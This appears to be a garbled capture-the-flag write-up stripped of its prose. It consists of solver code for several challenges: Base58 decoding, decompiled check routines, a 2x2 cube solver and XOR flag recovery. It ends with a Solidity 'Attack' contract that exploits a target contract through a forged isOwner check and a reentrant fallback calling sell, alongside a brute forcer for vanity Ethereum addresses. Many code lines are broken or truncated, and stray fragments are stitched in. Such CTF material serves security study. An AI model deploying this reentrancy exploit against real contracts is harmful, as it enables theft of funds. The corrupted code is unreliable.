    v = v.rstrip()
    v = scrub_input(v)
    origlen = len(v)
    v = v.lstrip(alphabet[0:1])
    newlen = len(v)
    acc = b58decode_int(v, alphabet=alphabet)
    result = []
    while acc > 0:
        acc, mod = divmod(acc, 256)
        result.append(mod)
    return b'\0' * (origlen - newlen) + bytes(reversed(result))
def b58encode_check(
    v: Union[str, bytes], alphabet: bytes = BITCOIN_ALPHABET
) -> bytes:
    """
    Encode a string using Base58 with a 4 character checksum
    """
    v = scrub_input(v)
    digest = sha256(sha256(v).digest()).digest()
    return b58encode(v + digest[:4], alphabet=alphabet)
def b58decode_check(
    v: Union[str, bytes], alphabet: bytes = BITCOIN_ALPHABET
) -> bytes:
    '''Decode and verify the checksum of a Base58 encoded string'''
    result = b58decode(v, alphabet=alphabet)
    result, check = result[:-4], result[-4:]
    digest = sha256(sha256(result).digest()).digest()
    if check != digest[:4]:
        raise ValueError("Invalid checksum")
    return result
print(b58decode('4VyhuTqRfYFnQ85Bcw5XcDr3ScNBjf5CzwUdWKVM7SSVqBrkvYGt7SSUJe'))
v0-v4Inori
v5 = 1;
  v6 = 0;
  v7 = 1;
  v8 = 0;
  v9 = 1;
  for ( i = 0; i > 7)
    && !(v1 >> 7)
    && !(v2 >> 7)
    && !(v3 >> 7)
    && !(v4 >> 7)
    && v0 >> 6 == 1
    && v1 >> 6 == 1
    && v2 >> 6 == 1
    && v3 >> 6 == 1
    && abs(v1 - v2) == 1
    && abs(v2 - v3) == 3
    && abs(v3 - v4) == 9
    && v0 >> 5 > 5 > 5 > 5 > 5 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
using namespace std;
int main() {
  unsigned char res[24] = {6, 4, 8, 7, 7, 5, 6, 17, 10, 5, 10, 13, 8, 3, 8, 7, 
2, 9, 8, 2, 8, 7, 11, 15};
  for (int idx = 0; idx > 4;
      unsigned char b = val & 0xf;
      unsigned char c = a ^ b;
      int ii = idx * 3;
      int jj = idx * 3 + 1;
      int kk = idx * 3 + 2;
      if (!(a & 1)) ++a;
      if (!(ii & 1)) ++a;
      ++b;
      ++b;
      if (c & 1) ++c;
      if (ii & 1) ++c;
      if (a == res[ii] && b == res[jj] && c == res[kk]) {
        printf("%c", val);
      }
    }
  }
}
Hint 1.graph 2.
mainfor
E20B1A1A13F9
for (i = 0; i 
int main() {
char v4[12] = {0};
char v5[12] = {0};
char v6[12] = {0};
v4[0] = -67;
v4[1] = -46;
v4[2] = -16;
v4[3] = -62;
v4[4] = -47;
v4[5] = -63;
v4[6] = -47;
v4[7] = -63;
v4[8] = -47;
v4[9] = -49;
v4[10] = -66;
v4[11] = -55;
v5[0] = -2;
v5[1] = -4;
v5[2] = -32;
v5[3] = -4;
v5[4] = -2;
v5[5] = -2;
v5[6] = -2;
v5[7] = -2;
v5[8] = -2;
v5[9] = -2;
v5[10] = -4;
v5[11] = -2;
for ( int i = 0; i >> import string
>>> t = string.maketrans("ABCDEF0123456789", "0123456789ABCDEF")
>>> a = 'E20B1A1A13F9'
>>> a.translate(t)
'48617070795F'
>>> a.translate(t).decode('hex')
'Happy_'
>>>
U:
27:24=36:33
36:33=33:30
33:30=30:27
30:27=27:24
6:3=21:18
9:6=24:21
21:18=45:42
24:21=48:45
45:42=54:51
48:45=57:54
54:51=6:3
57:54=9:6
R:
15:12=24:21
24:21=21:18
21:18=18:15
18:15=15:12
9:6=69:66
12:9=72:69
69:66=42:39
72:69=45:42
42:39=30:27
45:42=33:30
30:27=9:6
33:30=12:9
F:
3:0=12:9
12:9=9:6
9:6=6:3
6:3=3:0
18:15=33:30
21:18=36:33
33:30=57:54
36:33=60:57
57:54=66:63
60:57=69:66
66:63=3:0
69:66=21:18
import solver as sv # https://github.com/hkociemba/Rubiks2x2x2-OptimalSolver
def get(var):
    r = []
    for i in range(24):
        c = var & 7
        r.append(c)
        var >>= 3
    colors = ['D','F','R','U','B','L']
    return [colors[e] for e in r]
def adjust(a):
    f,r,u,b,l,d = [a[4*i:4*(i+1)] for i in range(6)]
    u = u[0] + u[1] + u[3] + u[2]
    b = b[2] + b[3] + b[1] + b[0] 
    d = d[1] + d[2] + d[0] + d[3]
    r = r[2] + r[3] + r[1] + r[0]
    l = l[1] + l[2] + l[0] + l[3]
    f = f[1] + f[2] + f[0] + f[3]
    return ''.join([u,r,f,d,l,b])
    return a
def get_cubestring(inp):
    a = get(inp)
    r = (adjust(''.join(a)))
    return r
init = 0xB6D9246DB492249
U = 0x0a4db646db912291
R = 0x900b6d8dc64b492009
F = 0x09002d924b5b4da249
assert(get_cubestring(init) == 'UUUURRRRFFFFDDDDLLLLBBBB')
assert(get_cubestring(U) == 'UUUUBBRRRRFFDDDDFFLLLLBB')
assert(get_cubestring(R) == 'UFUFRRRRFDFDDBDBLLLLUBUB')
assert(get_cubestring(F) == 'UULLURURFFFFRRDDLDLDBBBB')
if __name__ == '__main__':
easyparser
OwnerMoney
ropsten, sender, 
sender121. nonce, 
:
    cbs = 0x8e062d75c28130a415
    cubestring = get_cubestring(cbs)
    sol = sv.solve(cubestring)
    print(sol)
def catflag():
        dst = [144, 332, 28, 240, 132, 60, 24, 64, 64, 240, 208, 88, 44, 8, 
52, 240, 276, 240, 128, 44, 40, 52, 8, 240, 144, 68, 48, 80, 92, 44, 264, 240]
        r = ''
        for each in dst:
            for c in range(256):
                if (c ^ 0x63) << (2 & 0x3f) == each:
                    r+=(chr(c))
                    break
        print('flag{'+r+'}')
if __name__ == '__main__':
    catflag()
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import rlp
import sha3
import IPython
from eth_utils import keccak, to_checksum_address, to_bytes
from ecdsa import SigningKey, SECP256k1
my_addr = to_checksum_address('0x9Fd6Bd7F75fB554A206dFa952cCa508d07e974C8')
def mk_contract_address(sender, nonce):
  sender_bytes = to_bytes(hexstr=sender)
  raw = rlp.encode([sender_bytes, nonce])
  h = keccak(raw)
  address_bytes = h[12:]
  return to_checksum_address(address_bytes)
, :
def generate_addr():
  keccak = sha3.keccak_256()
  pk = SigningKey.generate(curve=SECP256k1)
  public = pk.get_verifying_key().to_string()
  keccak.update(public)
  address = "0x{}".format(keccak.hexdigest()[24:])
  return pk, address
while True:
  pk, addr = generate_addr()
  cont_addr = mk_contract_address(to_checksum_address(addr), 0)
  if cont_addr.lower().endswith('fff'):
    print(pk.to_string().hex(), addr)
pragma solidity ^0.4.26;
contract Attack {
  address public target;
  address public owner;
  bool private twice;
  bool private reentrant;
  constructor () public {
    target = address(0x40a590b70790930ceed4d148bf365eea9e8b35f4);
    owner = msg.sender;
    twice = false;
    reentrant = false;
  }
  function reset() public {
    require(owner == msg.sender);
    twice = false;
    reentrant = false;
  }
  function isOwner(address _addr) public returns (uint256) {
    if(twice == false) {
      twice = true;
      return 0;
    }
    return 1;
  }
  function buy() public {
    require(owner == msg.sender);
    require(target.call.value(0x1)(bytes4(keccak256("buy()"))));
  }
  function claim() public {
    require(owner == msg.sender);
    target.call(bytes4(0x11f776bc));
  }
  function change() public {
    require(owner == msg.sender);
    target.call(bytes4(keccak256("change(address)")), abi.encode(target));
  }
  function attack() public {
    require(owner == msg.sender);
    target.call(bytes4(keccak256("sell(uint256)")), abi.encode(uint256(200)));
  }
  function transfer(address attacker) public {
    require(owner == msg.sender);
    target.call(bytes4(keccak256("transfer(address,uint256)")), 
abi.encode(attacker), abi.encode(100));
  }
  function reverse_finance() public {
    require(owner == msg.sender);
    selfdestruct(target);
  }
  function payforflag(string b64email) public {
    require(owner == msg.sender);
    target.call(bytes4(keccak256("payforflag(string)")), 
abi.encode(b64email));
  }
  function payme() public payable { }
  function () public payable {
    if(msg.sender == target) {
      if(!reentrant) {
        reentrant = true;
        target.call(bytes4(keccak256("sell(uint256)")), 
abi.encode(uint256(200)));
      }
    }
  }
  function kill() public {
    require(owner == msg.sender);
    selfdestruct(owner);
, sell(uint256)balance, selfdestruct
  }
}